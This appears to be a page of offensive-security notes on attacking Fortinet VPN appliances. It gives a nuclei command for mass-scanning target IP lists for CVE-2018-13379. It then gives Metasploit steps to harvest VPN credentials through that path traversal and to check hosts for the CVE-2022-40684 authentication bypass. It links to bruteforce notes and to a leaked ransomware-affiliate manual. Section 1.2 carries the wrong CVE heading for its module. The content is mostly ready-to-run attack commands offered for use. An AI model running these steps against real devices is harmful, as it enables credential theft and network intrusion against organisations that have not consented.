# Fortinet

## 01 - CVE

### 1.1 - CVE-2018-13379

To find targets

Use nuclei to scan for vulnerable devices and remove false positives.

```
$ nuclei -l target_ips.txt -t ~/nuclei-templates -id CVE-2018-13379 -o fortinet-vulnerable-applances-output.txt
```

Then exploit it with `metasploit-framework` auxiliary module.

```
msf > use auxiliary/gather/fortios_vpnssl_traversal_creds_leak

msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > set rhosts file:fortinet-vulnerable-applances-output.txt

msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > set rport 10443

msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > run
```

### 1.2 - CVE-2018-13379

```
msf > use exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684

msf exploit(linux/http/fortinet_authentication_bypass_cve_2022_40684) > set rhosts file:10443_ips.txt

msf exploit(linux/http/fortinet_authentication_bypass_cve_2022_40684) > set rport 10443

msf exploit(linux/http/fortinet_authentication_bypass_cve_2022_40684) > check
```

## 02 - Bruteforce

Refer to this [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xC - Password Cracking/Online/Network Protocols/Remote Services/VPN/VPN Appliances/Fortinet|section]] for bruteforcing Fortinet VPN appliance.

---
## References

- [[VPN Appliances|Google Dork: VPN Appliances]]

- [7Elements: Fortigate](https://github.com/7Elements/Fortigate)

- [Enlace Hacktivista: Fortinet SSL VPN Path Traversal](https://enlacehacktivista.org/index.php?title=Fortinet_SSL_VPN_Path_Traversal)

- [VX Underground Papers: Bassterloard (FishEye) Networking Manual](https://web.archive.org/web/20230531145531/https://papers.vx-underground.org/papers/Malware%20Defense/Malware%20Analysis%202021/2021-08-31%20-%20Bassterlord%20%28FishEye%29%20Networking%20Manual%20%28X%29.pdf)